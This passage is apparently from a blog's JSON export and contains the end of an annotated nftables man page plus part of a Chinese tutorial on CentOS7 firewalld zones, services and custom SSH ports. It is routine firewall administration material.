***dnat*** and ***redirect*** statements are only valid in the prerouting and output chains, they specify that the destination address of the packet should be modified. You can use non-base chains which are called from base chains of nat chain type too. All future packets in this connection will also be mangled, and rules should cease being examined.\\n\\nThe ***masquerade*** statement is a special form of ***snat*** which always uses the outgoing interface\'s IP address to translate to. It is particularly useful on gateways with dynamic (public) IP addresses.\\n\\nThe ***redirect*** statement is a special form of ***dnat*** which always translates the destination address to the local host\'s one. It comes in handy if one only wants to alter the destination port of incoming traffic on different interfaces.\\n\\nNote that all nat statements require both prerouting and postrouting base chains to be present since otherwise packets on the return path won\'t be seen by netfilter and therefore no reverse translation will take place.\\n\\n\\n***Table 53. NAT statement values***\\n\\n| Expression | Description | Type |\\n| --- | --- | --- |\\n| address | Specifies that the source/destination address of the packet should be modified. You may specify a mapping to relate a list of tuples composed of arbitrary expression key with address value. | ipv4_addr, ipv6_addr, eg. abcd::1234, or you can use a mapping, eg. meta mark map \\\\{ 10 : 192.168.1.2, 20 : 192.168.1.3 \\\\} |\\n| port | Specifies that the source/destination address of the packet should be modified. | port number (16 bits) |\\n\\n\\n\\n\\n***Table 54. NAT statement flags***\\n\\n| Flag | Description |\\n| --- | --- |\\n| persistent | Gives a client the same source-/destination-address for each connection. |\\n| random | If used then port mapping will be randomized using a random seeded MD5 hash mix using source and destination address and destination port. |\\n| fully-random | If used then port mapping is generated based on a 32-bit pseudo-random algorithm. |\\n\\n\\n\\n\\n***\u793a\u4f8b 23. Using NAT statements***\\n\\n~~~\\n# create a suitable table/chain setup for all further examples\\nadd table nat\\nadd chain nat prerouting { type nat hook prerouting priority 0; }\\nadd chain nat postrouting { type nat hook postrouting priority 100; }\\n\\n# translate source addresses of all packets leaving via eth0 to address 1.2.3.4\\nadd rule nat postrouting oif eth0 snat to 1.2.3.4\\n\\n# redirect all traffic entering via eth0 to destination address 192.168.1.120\\nadd rule nat prerouting iif eth0 dnat to 192.168.1.120\\n\\n# translate source addresses of all packets leaving via eth0 to whatever\\n# locally generated packets would use as source to reach the same destination\\nadd rule nat postrouting oif eth0 masquerade\\n\\n# redirect incoming TCP traffic for port 22 to port 2222\\nadd rule nat prerouting tcp dport 22 redirect to :2222\\n~~~\\n\\n\\n### Queue statement\\n\\nThis statement passes the packet to userspace using the nfnetlink_queue handler. The packet is put into the queue identified by its 16-bit queue number. Userspace can inspect and modify the packet if desired. Userspace must then drop or reinject the packet into the kernel. See libnetfilter_queue documentation for details.\\n\\n`queue [num _queue_number_] [bypass]`\\n\\n`queue [num _queue_number_from_ - _queue_number_to_] [bypass,fanout]`\\n\\n\\n***Table 55. queue statement values***\\n\\n| Value | Description | Type |\\n| --- | --- | --- |\\n| queue_number | Sets queue number, default is 0. | unsigned integer (16 bit) |\\n| queue_number_from | Sets initial queue in the range, if fanout is used. | unsigned integer (16 bit) |\\n| queue_number_to | Sets closing queue in the range, if fanout is used. | unsigned integer (16 bit) |\\n\\n\\n\\n***Table 56. queue statement flags***\\n\\n| Flag | Description |\\n| --- | --- |\\n| bypass | Let packets go through if userspace application cannot back off. Before using this flag, read libnetfilter_queue documentation for performance tuning recomendations. |\\n| fanout | Distribute packets between several queues. |\\n\\n\\n\\n## Additional commands\\n\\nThese are some additional commands included in nft.\\n\\n\\n### export\\n\\nExport your current ruleset in XML or JSON format to stdout.\\n\\nExamples:\\n\\n~~~\\n[...]\\n% nft export json\\n[...]\\n~~~\\n\\n\\n\\n### monitor\\n\\nThe monitor command allows you to listen to Netlink events produced by the nf_tables subsystem, related to creation and deletion of objects. When they ocurr, nft will print to stdout the monitored events in either XML, JSON or native nft format.\\n\\nTo filter events related to a concrete object, use one of the keywords \'tables\', \'chains\', \'sets\', \'rules\', \'elements\'.\\n\\nTo filter events related to a concrete action, use keyword \'new\' or \'destroy\'.\\n\\nHit ^C to finish the monitor operation.\\n\\n\\n***\u793a\u4f8b 24. Listen to all events, report in native nft format***\\n\\n~~~\\n% nft monitor\\n~~~\\n\\n\\n\\n***\u793a\u4f8b 25. Listen to added tables, report in XML format***\\n\\n~~~\\n% nft monitor new tables xml\\n~~~\\n\\n\\n\\n\\n***\u793a\u4f8b 26. Listen to deleted rules, report in JSON format***\\n\\n~~~\\n% nft monitor destroy rules json\\n~~~\\n\\n\\n\\n\\n***\u793a\u4f8b 27. Listen to both new and destroyed chains, in native nft format***\\n\\n~~~\\n% nft monitor chains\\n~~~\\n\\n\\n## Error reporting\\n\\nWhen an error is detected, nft shows the line(s) containing the error, the position of the erroneous parts in the input stream and marks up the erroneous parts using carrets (^). If the error results from the combination of two expressions or statements, the part imposing the constraints which are violated is marked using tildes (~).\\n\\nFor errors returned by the kernel, nft can\'t detect which parts of the input caused the error and the entire command is marked.\\n\\n\\n***\u793a\u4f8b 28. Error caused by single incorrect expression***\\n\\n~~~\\n<cmdline>:1:19-22: Error: Interface does not exist\\nfilter output oif eth0\\n                  ^^^^\\n~~~\\n\\n\\n\\n\\n***\u793a\u4f8b 29. Error caused by invalid combination of two expressions***\\n\\n~~~\\n<cmdline>:1:28-36: Error: Right hand side of relational expression (==) must be constant\\nfilter output tcp dport == tcp dport\\n                        ~~ ^^^^^^^^^\\n~~~\\n\\n\\n\\n\\n***\u793a\u4f8b 30. Error returned by the kernel***\\n\\n~~~\\n<cmdline>:0:0-23: Error: Could not process rule: Operation not permitted\\nfilter output oif wlan0\\n^^^^^^^^^^^^^^^^^^^^^^^\\n~~~\\n\\n\\n## \u9000\u51fa\u72b6\u6001\u7801\\n\\nOn success, nft exits with a status of 0. Unspecified errors cause it to exit with a status of 1, memory allocation errors with a status of 2, unable to open Netlink socket with 3.\\n\\n\\n\\n## See Also\\n\\niptables(8), ip6tables(8), arptables(8), ebtables(8), ip(8), tc(8)\\n\\nThere is an official wiki at: [wiki.nftables.org](http://wiki.nftables.org)\\n\\n\\n\\n## Authors\\n\\nnftables was written by Patrick McHardy and Pablo Neira Ayuso, among many other contributors from the Netfilter community.\\n\\n\\n\\n## Copyright\\n\\n* Copyright\xa0\xa9\xa02008-2014\xa0Patrick\xa0McHardy\xa0\\\\<[kaber@trash.net](mailto:kaber@trash.net)\\\\>\\n* Copyright\xa0\xa9\xa02013-2016\xa0Pablo\xa0Neira\xa0Ayuso\xa0\\\\<[pablo@netfilter.org](mailto:pablo@netfilter.org)\\\\>\\n\\nnftables is free software; you can redistribute it and/or modify it under the terms of the GNU General Public License version 2 as published by the Free Software Foundation.\\n\\n***This documentation is licenced under the terms of the Creative Commons Attribution-ShareAlike 4.0 license, [CC BY-SA 4.0](http://creativecommons.org/licenses/by-sa/4.0/).***"},{"id":"/2017/05/31/first-post","metadata":{"permalink":"/notes/blog/2017/05/31/first-post","editUrl":"https://github.com/itxx00/notes/tree/main/blog/2017-05-31-first-post.md","source":"@site/blog/2017-05-31-first-post.md","title":"\u5f00\u7bc7","description":"\u91cd\u65b0\u5199\u535a\u5ba2","date":"2017-05-31T00:00:00.000Z","tags":[],"readingTime":0.32,"hasTruncateMarker":false,"authors":[],"frontMatter":{"layout":"post","author_profile":true,"title":"\u5f00\u7bc7","description":"\u91cd\u65b0\u5199\u535a\u5ba2"},"unlisted":false,"prevItem":{"title":"nftables\uff1anft man\u6587\u6863\u9605\u8bfb\u7b14\u8bb0","permalink":"/notes/blog/2017/06/13/nftables-man-page"},"nextItem":{"title":"CENTOS7\u7ba1\u7406\u4e4b\u52a8\u6001\u9632\u706b\u5899FIREWALLD","permalink":"/notes/blog/2015/01/03/centos7-firewalld-basic"}},"content":"\u91cd\u65b0\u5f00\u59cb\u5199\u535a\u5ba2\uff0c\u8fd9\u7bc7\u4f5c\u4e3a\u5f00\u7bc7\uff0c\u7ee7\u5fd9\u788c\u5730\u5de5\u4f5c\u4e86\u5feb\u4e24\u5e74\u4e4b\u540e\uff0c\u53d1\u73b0\u62bd\u65f6\u95f4\u5c06\u4e00\u4e9b\u60f3\u6cd5\u548c\u7ecf\u9a8c\u6c89\u6dc0\u4e0b\u6765\u4e5f\u662f\u5982\u6b64\u91cd\u8981\u3002\u800c\u6574\u7406\u6587\u7ae0\u7684\u8fc7\u7a0b\u672c\u8eab\u4e5f\u662f\u5bf9\u601d\u7eea\u7684\u6574\u7406\uff0c\u53ef\u4ee5\u5e2e\u52a9\u6211\u4eec\u66f4\u597d\u7684\u7406\u89e3\u6240\u505a\u7684\u4e8b\u60c5\u3002\\n\u63a5\u4e0b\u6765\u4f1a\u628a\u65e7\u535a\u5ba2\u7684\u5907\u4efd\u6587\u7ae0\u91cd\u65b0\u653e\u4e0a\u6765\u3002"},{"id":"/2015/01/03/centos7-firewalld-basic","metadata":{"permalink":"/notes/blog/2015/01/03/centos7-firewalld-basic","editUrl":"https://github.com/itxx00/notes/tree/main/blog/2015-01-03-centos7-firewalld-basic.md","source":"@site/blog/2015-01-03-centos7-firewalld-basic.md","title":"CENTOS7\u7ba1\u7406\u4e4b\u52a8\u6001\u9632\u706b\u5899FIREWALLD","description":"","date":"2015-01-03T00:00:00.000Z","tags":[{"inline":true,"label":"firewalld","permalink":"/notes/blog/tags/firewalld"}],"readingTime":7.59,"hasTruncateMarker":false,"authors":[],"frontMatter":{"layout":"post","title":"CENTOS7\u7ba1\u7406\u4e4b\u52a8\u6001\u9632\u706b\u5899FIREWALLD","description":"","categories":["system"],"tags":["firewalld"]},"unlisted":false,"prevItem":{"title":"\u5f00\u7bc7","permalink":"/notes/blog/2017/05/31/first-post"},"nextItem":{"title":"NGINX\u6027\u80fd\u8c03\u4f18\u7b80\u8981","permalink":"/notes/blog/2014/10/19/nginx-perf-tun"}},"content":"> firewalld \u7684\u51fa\u73b0\u5e26\u6765\u4e86\u8bb8\u591a\u65b0\u7684\u4eae\u70b9\uff0c\u5b83\u4f7f\u5f97\u9632\u706b\u5899\u89c4\u5219\u7ba1\u7406\u66f4\u52a0\u65b9\u4fbf\u548c\u7edf\u4e00\uff0c\u4f46 firewalld \u9879\u76ee\u672c\u8eab\u8fd8\u6709\u8bf8\u591a\u4e0d\u5b8c\u5584\u7684\u5730\u65b9\uff0c\u8fd8\u9700\u8981\u4e00\u4e9b\u65f6\u95f4\u7684\u6c89\u6dc0\u624d\u80fd\u53d8\u5f97\u66f4\u52a0\u7a33\u5b9a\u548c\u5f97\u5230\u66f4\u591a\u8f6f\u4ef6\u793e\u533a\u7684\u652f\u6301\u3002\u5728\u6211\u4eec\u4f7f\u7528\u8fc7\u7a0b\u4e2d\u4e5f\u53d1\u73b0\u4e86\u5176\u5b58\u5728\u7684\u4e00\u4e9b\u95ee\u9898\uff0c\u6211\u4eec\u4e5f\u6b63\u5728\u52aa\u529b\u53c2\u4e0e\u5230 firewalld \u7684\u6539\u8fdb\u548c\u6d4b\u8bd5\u5f53\u4e2d\uff0c\u4e5f\u5e0c\u671b\u6709\u66f4\u591a\u7684\u4eba\u80fd\u591f\u53c2\u4e0e\u8fdb\u6765\u3002\\n\\n\\n## firewalld\u7684\u51fa\u73b0\\n\u81ea fedora18 \u5f00\u59cb\uff0cfirewalld \u5df2\u7ecf\u6210\u4e3a\u9ed8\u8ba4\u7684\u9632\u706b\u5899\u7ba1\u7406\u7ec4\u4ef6\u88ab\u96c6\u6210\u5230\u7cfb\u7edf\u4e2d\uff0c\u7528\u4ee5\u53d6\u4ee3 iptables service \u670d\u52a1\uff0c\u800c\u57fa\u4e8e fedora18 \u5f00\u53d1\u7684RHEL7\uff0c\u4ee5\u53ca\u5176\u4e00\u8109\u76f8\u627f\u7684CentOS7 \u4e5f\u90fd\u4f7f\u7528 firewalld \u4f5c\u4e3a\u9ed8\u8ba4\u7684\u9632\u706b\u5899\u7ba1\u7406\u7ec4\u4ef6\uff0c\u65e0\u8bba\u662f\u5bf9\u4e8e\u65e5\u5e38\u4f7f\u7528\u8fd8\u662f\u4f01\u4e1a\u5e94\u7528\u6765\u8bb2\u8fd9\u6837\u7684\u53d8\u66f4\u90fd\u6216\u591a\u6216\u5c11\u7684\u4e3a\u4f7f\u7528\u8005\u5e26\u6765\u4e86\u5f71\u54cd\u3002\u5728\u6d4f\u89c8\u5b8c\u672c\u6587\u524d\u6211\u4eec\u5148\u4e0d\u6025\u7740\u4e0b\u7ed3\u8bba\u5230\u5e95\u8fd9\u6837\u7684\u53d8\u5316\u662f\u597d\u662f\u574f\uff0c\u8ba9\u6211\u4eec\u201c\u5265\u79bb\u5b83\u5929\u751f\u7684\u9a84\u50b2\uff0c\u6392\u9664\u8fd9\u4e9b\u5916\u754c\u7684\u5e72\u6270\u201c\uff0c\u6765\u770b\u770b firewalld \u5230\u5e95\u662f\u4ec0\u4e48\u6837\u7684\u3002\\n\u4ee5\u4e0b\u5185\u5bb9\u4ee5 CentOS7 \u7cfb\u7edf\u4e3a\u4f8b\u8fdb\u884c\u8bb2\u89e3\uff0c\u6211\u4eec\u5047\u8bbe\u8bfb\u8005\u5bf9\u4e8e iptables \u9632\u706b\u5899\u76f8\u5173\u77e5\u8bc6\u6709\u4e00\u5b9a\u7684\u638c\u63e1\u3002\\n\\n## \u4ec0\u4e48\u662f\u52a8\u6001\u9632\u706b\u5899\uff1f\\n\u6211\u4eec\u9996\u5148\u9700\u8981\u5f04\u660e\u767d\u7684\u7b2c\u4e00\u4e2a\u95ee\u9898\u662f\u5230\u5e95\u4ec0\u4e48\u662f\u52a8\u6001\u9632\u706b\u5899\u3002\u4e3a\u4e86\u89e3\u7b54\u8fd9\u4e2a\u95ee\u9898\uff0c\u6211\u4eec\u5148\u6765\u56de\u5fc6\u4e00\u4e0b iptables service \u7ba1\u7406\u9632\u706b\u5899\u89c4\u5219\u7684\u6a21\u5f0f\uff1a\u7528\u6237\u5c06\u65b0\u7684\u9632\u706b\u5899\u89c4\u5219\u6dfb\u52a0\u8fdb /etc/sysconfig/iptables \u914d\u7f6e\u6587\u4ef6\u5f53\u4e2d\uff0c\u518d\u6267\u884c\u547d\u4ee4 service iptables reload \u4f7f\u53d8\u66f4\u7684\u89c4\u5219\u751f\u6548\u3002\u5728\u8fd9\u6574\u4e2a\u8fc7\u7a0b\u7684\u80cc\u540e\uff0ciptables service \u9996\u5148\u5bf9\u65e7\u7684\u9632\u706b\u5899\u89c4\u5219\u8fdb\u884c\u4e86\u6e05\u7a7a\uff0c\u7136\u540e\u91cd\u65b0\u5b8c\u6574\u5730\u52a0\u8f7d\u6240\u6709\u65b0\u7684\u9632\u706b\u5899\u89c4\u5219\uff0c\u800c\u5982\u679c\u914d\u7f6e\u4e86\u9700\u8981 reload \u5185\u6838\u6a21\u5757\u7684\u8bdd\uff0c\u8fc7\u7a0b\u80cc\u540e\u8fd8\u4f1a\u5305\u542b\u5378\u8f7d\u548c\u91cd\u65b0\u52a0\u8f7d\u5185\u6838\u6a21\u5757\u7684\u52a8\u4f5c\uff0c\u800c\u4e0d\u5e78\u7684\u662f\uff0c\u8fd9\u4e2a\u52a8\u4f5c\u5f88\u53ef\u80fd\u5bf9\u8fd0\u884c\u4e2d\u7684\u7cfb\u7edf\u4ea7\u751f\u989d\u5916\u7684\u4e0d\u826f\u5f71\u54cd\uff0c\u7279\u522b\u662f\u5728\u7f51\u7edc\u975e\u5e38\u7e41\u5fd9\u7684\u7cfb\u7edf\u4e2d\u3002\\n\\n\u5982\u679c\u6211\u4eec\u628a\u8fd9\u79cd\u54ea\u6015\u53ea\u4fee\u6539\u4e00\u6761\u89c4\u5219\u4e5f\u8981\u8fdb\u884c\u6240\u6709\u89c4\u5219\u7684\u91cd\u65b0\u8f7d\u5165\u7684\u6a21\u5f0f\u79f0\u4e3a\u9759\u6001\u9632\u706b\u5899\u7684\u8bdd\uff0c\u90a3\u4e48 firewalld \u6240\u63d0\u4f9b\u7684\u6a21\u5f0f\u5c31\u53ef\u4ee5\u53eb\u505a\u52a8\u6001\u9632\u706b\u5899\uff0c\u5b83\u7684\u51fa\u73b0\u5c31\u662f\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e00\u95ee\u9898\uff0c\u4efb\u4f55\u89c4\u5219\u7684\u53d8\u66f4\u90fd\u4e0d\u9700\u8981\u5bf9\u6574\u4e2a\u9632\u706b\u5899\u89c4\u5219\u5217\u8868\u8fdb\u884c\u91cd\u65b0\u52a0\u8f7d\uff0c\u53ea\u9700\u8981\u5c06\u53d8\u66f4\u90e8\u5206\u4fdd\u5b58\u5e76\u66f4\u65b0\u5230\u8fd0\u884c\u4e2d\u7684 iptables \u5373\u53ef\u3002\\n\\n\u8fd9\u91cc\u6709\u5fc5\u8981\u8bf4\u660e\u4e00\u4e0b firewalld \u548c iptables \u4e4b\u95f4\u7684\u5173\u7cfb\uff0c firewalld \u63d0\u4f9b\u4e86\u4e00\u4e2a daemon \u548c service\uff0c\u8fd8\u6709\u547d\u4ee4\u884c\u548c\u56fe\u5f62\u754c\u9762\u914d\u7f6e\u5de5\u5177\uff0c\u5b83\u4ec5\u4ec5\u662f\u66ff\u4ee3\u4e86 iptables service \u90e8\u5206\uff0c\u5176\u5e95\u5c42\u8fd8\u662f\u4f7f\u7528 iptables \u4f5c\u4e3a\u9632\u706b\u5899\u89c4\u5219\u7ba1\u7406\u5165\u53e3\u3002firewalld \u4f7f\u7528 python \u8bed\u8a00\u5f00\u53d1\uff0c\u5728\u65b0\u7248\u672c\u4e2d\u5df2\u7ecf\u8ba1\u5212\u4f7f\u7528 c++ \u91cd\u5199 daemon \u90e8\u5206\u3002\\n\\n## firewalld \u5177\u6709\u54ea\u4e9b\u7279\u6027\uff1f\\n\\n\u90a3\u4e48 firewalld \u9664\u4e86\u662f\u52a8\u6001\u9632\u706b\u5899\u4ee5\u5916\uff0c\u5b83\u8fd8\u5177\u6709\u54ea\u4e9b\u4f18\u52bf\u6216\u8005\u7279\u6027\u5462\uff1f\u7b2c\u4e00\u4e2a\u662f\u914d\u7f6e\u6587\u4ef6\u3002firewalld \u7684\u914d\u7f6e\u6587\u4ef6\u88ab\u653e\u7f6e\u5728\u4e0d\u540c\u7684 xml \u6587\u4ef6\u5f53\u4e2d\uff0c\u8fd9\u4f7f\u5f97\u5bf9\u89c4\u5219\u7684\u7ef4\u62a4\u53d8\u5f97\u66f4\u52a0\u5bb9\u6613\u548c\u53ef\u8bfb\uff0c\u6709\u6761\u7406\u3002\u76f8\u6bd4\u4e8e iptables \u7684\u89c4\u5219\u914d\u7f6e\u6587\u4ef6\u800c\u8a00\uff0c\u8fd9\u663e\u7136\u53ef\u4ee5\u7b97\u4f5c\u662f\u4e00\u4e2a\u8fdb\u6b65\u3002\u7b2c\u4e8c\u4e2a\u662f\u533a\u57df\u6a21\u578b\u3002firewalld \u901a\u8fc7\u5bf9 iptables \u81ea\u5b9a\u4e49\u94fe\u7684\u4f7f\u7528\uff0c\u62bd\u8c61\u51fa\u4e00\u4e2a\u533a\u57df\u6a21\u578b\u7684\u6982\u5ff5\uff0c\u5c06\u539f\u672c\u5341\u5206\u7075\u6d3b\u7684\u81ea\u5b9a\u4e49\u94fe\u7edf\u4e00\u6210\u4e00\u5957\u9ed8\u8ba4\u7684\u6807\u51c6\u4f7f\u7528\u89c4\u8303\u548c\u6d41\u7a0b\uff0c\u4f7f\u5f97\u9632\u706b\u5899\u5728\u6613\u7528\u6027\u548c\u901a\u7528\u6027\u4e0a\u5f97\u5230\u63d0\u5347\u3002\u4ee4\u4e00\u4e2a\u91cd\u8981\u7279\u6027\u662f\u5bf9 ebtables \u7684\u652f\u6301\uff0c\u901a\u8fc7\u7edf\u4e00\u7684\u63a5\u53e3\u6765\u5b9e\u73b0 ipt/ebt \u7684\u7edf\u4e00\u7ba1\u7406\u3002\u8fd8\u6709\u4e00\u4e2a\u91cd\u8981\u7279\u6027\u662f\u5bcc\u8bed\u8a00\u3002\u5bcc\u8bed\u8a00\u98ce\u683c\u7684\u914d\u7f6e\u8ba9\u89c4\u5219\u7ba1\u7406\u53d8\u5f97\u66f4\u52a0\u4eba\u6027\u5316\uff0c\u5b66\u4e60\u95e8\u69db\u76f8\u6bd4\u539f\u751f\u7684 iptables \u547d\u4ee4\u6709\u6240\u964d\u4f4e\uff0c\u8ba9\u521d\u5b66\u8005\u53ef\u4ee5\u5728\u5f88\u77ed\u65f6\u95f4\u5185\u638c\u63e1\u5176\u57fa\u672c\u7528\u6cd5\uff0c\u89c4\u5219\u7ba1\u7406\u53d8\u5f97\u66f4\u5feb\u6377\u3002\\n\\n## firewalld \u57fa\u672c\u672f\u8bed\\n\\n\u672c\u6587\u4e0d\u6253\u7b97\u91cd\u590d\u9610\u8ff0\u73b0\u6709\u6587\u6863\u4e2d\u7684\u57fa\u672c\u77e5\u8bc6\uff0c\u4ec5\u4ec5\u63d0\u4f9b\u4e00\u4e9b\u5bf9\u73b0\u6709\u6587\u6863\u4e2d\u77e5\u8bc6\u7684\u8865\u5145\u548c\u7406\u89e3\uff0c\u8be6\u7ec6\u7684\u6587\u6863\u8bf7\u53c2\u9605man page\u6216\u672c\u6587\u7ed3\u5c3e\u5904\u7684\u5ef6\u4f38\u9605\u8bfb[^1]\u90e8\u5206\u3002\\n\\n### zone\uff1a\\nfirewalld\u5c06\u7f51\u5361\u5bf9\u5e94\u5230\u4e0d\u540c\u7684\u533a\u57df\uff08zone\uff09\uff0czone \u9ed8\u8ba4\u5171\u67099\u4e2a\uff0cblock  dmz  drop  external  home  internal  public  trusted  work \uff0c\u4e0d\u540c\u7684\u533a\u57df\u4e4b\u95f4\u7684\u5dee\u5f02\u662f\u5176\u5bf9\u5f85\u6570\u636e\u5305\u7684\u9ed8\u8ba4\u884c\u4e3a\u4e0d\u540c\uff0c\u6839\u636e\u533a\u57df\u540d\u5b57\u6211\u4eec\u53ef\u4ee5\u5f88\u76f4\u89c2\u7684\u77e5\u9053\u8be5\u533a\u57df\u7684\u7279\u5f81\uff0c\u5728CentOS7\u7cfb\u7edf\u4e2d\uff0c\u9ed8\u8ba4\u533a\u57df\u88ab\u8bbe\u7f6e\u4e3apublic\uff0c\u800c\u5728\u6700\u65b0\u7248\u672c\u7684fedora\uff08fedora21\uff09\u5f53\u4e2d\u968f\u7740 server \u7248\u548c workstation \u7248\u7684\u5206\u5316\u5219\u6dfb\u52a0\u4e86\u4e24\u4e2a\u4e0d\u540c\u7684\u81ea\u5b9a\u4e49 zone FedoraServer \u548c FedoraWorkstation \u5206\u522b\u5bf9\u5e94\u4e24\u4e2a\u7248\u672c\u3002\u4f7f\u7528\u4e0b\u9762\u7684\u547d\u4ee4\u5206\u522b\u5217\u51fa\u6240\u6709\u652f\u6301\u7684 zone \u548c\u67e5\u770b\u5f53\u524d\u7684\u9ed8\u8ba4 zone\uff1a\\n```\\nfirewall-cmd --get-zones\\nfirewall-cmd --get-default-zone\\n```\\n\\n\u6240\u6709\u53ef\u7528 zone \u7684 xml \u914d\u7f6e\u6587\u4ef6\u88ab\u4fdd\u5b58\u5728 /usr/lib/firewalld/zones/ \u76ee\u5f55\uff0c\u8be5\u76ee\u5f55\u4e2d\u7684\u914d\u7f6e\u4e3a\u9ed8\u8ba4\u914d\u7f6e\uff0c\u4e0d\u5141\u8bb8\u7ba1\u7406\u5458\u624b\u5de5\u4fee\u6539\uff0c\u81ea\u5b9a\u4e49 zone \u914d\u7f6e\u9700\u4fdd\u5b58\u5230 /etc/firewalld/zones/ \u76ee\u5f55\u3002\u9632\u706b\u5899\u89c4\u5219\u5373\u662f\u901a\u8fc7 zone \u914d\u7f6e\u6587\u4ef6\u8fdb\u884c\u7ec4\u7ec7\u7ba1\u7406\uff0c\u56e0\u6b64 zone \u7684\u914d\u7f6e\u6587\u4ef6\u529f\u80fd\u7c7b\u4f3c\u4e8e /etc/sysconfig/iptables \u6587\u4ef6\uff0c\u53ea\u4e0d\u8fc7\u6839\u636e\u4e0d\u540c\u7684\u573a\u666f\u9ed8\u8ba4\u5b9a\u4e49\u4e86\u4e0d\u540c\u7684\u7248\u672c\u4f9b\u9009\u62e9\u4f7f\u7528\uff0c\u8fd9\u5c31\u662f zone \u7684\u65b9\u4fbf\u4e4b\u5904\u3002\\n\\n### service\uff1a\\n\u5728 /usr/lib/firewalld/services/ \u76ee\u5f55\u4e2d\uff0c\u8fd8\u4fdd\u5b58\u4e86\u53e6\u5916\u4e00\u7c7b\u914d\u7f6e\u6587\u4ef6\uff0c\u6bcf\u4e2a\u6587\u4ef6\u5bf9\u5e94\u4e00\u9879\u5177\u4f53\u7684\u7f51\u7edc\u670d\u52a1\uff0c\u5982 ssh \u670d\u52a1\u7b49\uff0c\u4e0e\u4e4b\u5bf9\u5e94\u7684\u914d\u7f6e\u6587\u4ef6\u4e2d\u8bb0\u5f55\u4e86\u5404\u9879\u670d\u52a1\u6240\u4f7f\u7528\u7684 tcp/udp \u7aef\u53e3\uff0c\u5728\u6700\u65b0\u7248\u672c\u7684 firewalld \u4e2d\u9ed8\u8ba4\u5df2\u7ecf\u5b9a\u4e49\u4e86 70+ \u79cd\u670d\u52a1\u4f9b\u6211\u4eec\u4f7f\u7528\uff0c\u5f53\u9ed8\u8ba4\u63d0\u4f9b\u7684\u670d\u52a1\u4e0d\u591f\u7528\u6216\u8005\u9700\u8981\u81ea\u5b9a\u4e49\u67d0\u9879\u670d\u52a1\u7684\u7aef\u53e3\u65f6\uff0c\u6211\u4eec\u9700\u8981\u5c06 service \u914d\u7f6e\u6587\u4ef6\u653e\u7f6e\u5728 /etc/firewalld/services/ \u76ee\u5f55\u4e2d\u3002service \u914d\u7f6e\u7684\u597d\u5904\u663e\u800c\u6613\u89c1\uff0c\u7b2c\u4e00\uff0c\u901a\u8fc7\u670d\u52a1\u540d\u5b57\u6765\u7ba1\u7406\u89c4\u5219\u66f4\u52a0\u4eba\u6027\u5316\uff0c\u7b2c\u4e8c\uff0c\u901a\u8fc7\u670d\u52a1\u6765\u7ec4\u7ec7\u7aef\u53e3\u5206\u7ec4\u7684\u6a21\u5f0f\u66f4\u52a0\u9ad8\u6548\uff0c\u5982\u679c\u4e00\u4e2a\u670d\u52a1\u4f7f\u7528\u4e86\u82e5\u5e72\u4e2a\u7f51\u7edc\u7aef\u53e3\uff0c\u5219\u670d\u52a1\u7684\u914d\u7f6e\u6587\u4ef6\u5c31\u76f8\u5f53\u4e8e\u63d0\u4f9b\u4e86\u5230\u8fd9\u4e9b\u7aef\u53e3\u7684\u89c4\u5219\u7ba1\u7406\u7684\u6279\u91cf\u64cd\u4f5c\u5feb\u6377\u65b9\u5f0f\u3002\u6bcf\u52a0\u8f7d\u4e00\u9879 service \u914d\u7f6e\u5c31\u610f\u5473\u7740\u5f00\u653e\u4e86\u5bf9\u5e94\u7684\u7aef\u53e3\u8bbf\u95ee\uff0c\u4f7f\u7528\u4e0b\u9762\u7684\u547d\u4ee4\u5206\u522b\u5217\u51fa\u6240\u6709\u652f\u6301\u7684 service \u548c\u67e5\u770b\u5f53\u524d zone \u79cd\u52a0\u8f7d\u7684 service\uff1a\\n```\\nfirewall-cmd --get-services\\nfirewall-cmd --list-services\\n```\\n\\n## \u4f7f\u7528\u793a\u4f8b\\n\\n\u5728 firewalld \u5b98\u65b9\u6587\u6863\u4e2d\u63d0\u4f9b\u4e86\u82e5\u5e72\u4f7f\u7528\u793a\u4f8b\uff0c\u8fd9\u4e9b\u793a\u4f8b\u5bf9\u5b66\u4e60\u9632\u706b\u5899\u7ba1\u7406\u662f\u5f88\u597d\u7684\u57fa\u672c\u53c2\u8003\u8d44\u6599\u3002\u63a5\u4e0b\u6765\u6211\u4eec\u5c06\u901a\u8fc7\u4e00\u4e9b\u771f\u5b9e\u7684\u4f7f\u7528\u793a\u4f8b\u6765\u5c55\u793a\u5982\u4f55\u4f7f\u7528 firewalld \u5bf9\u9632\u706b\u5899\u89c4\u5219\u8fdb\u884c\u7ba1\u7406\u3002\\n\\n### \u573a\u666f\u4e00\uff1a\u81ea\u5b9a\u4e49 ssh \u7aef\u53e3\u53f7\\n\u51fa\u4e8e\u5b89\u5168\u56e0\u7d20\u6211\u4eec\u5f80\u5f80\u9700\u8981\u5bf9\u4e00\u4e9b\u5173\u952e\u7684\u7f51\u7edc\u670d\u52a1\u9ed8\u8ba4\u7aef\u53e3\u53f7\u8fdb\u884c\u53d8\u66f4\uff0c\u5982 ssh\uff0cssh \u7684\u9ed8\u8ba4\u7aef\u53e3\u53f7\u662f 22\uff0c\u901a\u8fc7\u67e5\u770b\u9632\u706b\u5899\u89c4\u5219\u53ef\u4ee5\u53d1\u73b0\u9ed8\u8ba4\u662f\u5f00\u653e\u4e86 22 \u7aef\u53e3\u7684\u8bbf\u95ee\u7684\uff1a\\n\\n```\\n[root@localhost ~]# iptables -S\\n... ...\\n-A IN_public_allow -p tcp -m tcp --dport 22 -m conntrack --ctstate NEW -j ACCEPT\\n```\\n\\n\u5047\u8bbe\u81ea\u5b9a\u4e49\u7684 ssh \u7aef\u53e3\u53f7\u4e3a 22022\uff0c\u4f7f\u7528\u4e0b\u9762\u7684\u547d\u4ee4\u6765\u6dfb\u52a0\u65b0\u7aef\u53e3\u7684\u9632\u706b\u5899\u89c4\u5219\uff1a\\n```\\nfirewall-cmd --add-port=22022/tcp\\n```\\n\\n\u5982\u679c\u9700\u8981\u4f7f\u89c4\u5219\u4fdd\u5b58\u5230 zone \u914d\u7f6e\u6587\u4ef6\uff0c\u5219\u9700\u8981\u52a0\u53c2\u6570 --permanent\u3002\u6211\u4eec\u8fd8\u53ef\u4ee5\u4f7f\u7528\u81ea\u5b9a\u4e49 service \u7684\u65b9\u5f0f\u6765\u5b9e\u73b0\u540c\u6837\u7684\u6548\u679c\uff1a\\n\u5728 `/etc/firewalld/services/` \u76ee\u5f55\u4e2d\u6dfb\u52a0 \u81ea\u5b9a\u4e49\u914d\u7f6e\u6587\u4ef6 custom-ssh.xml 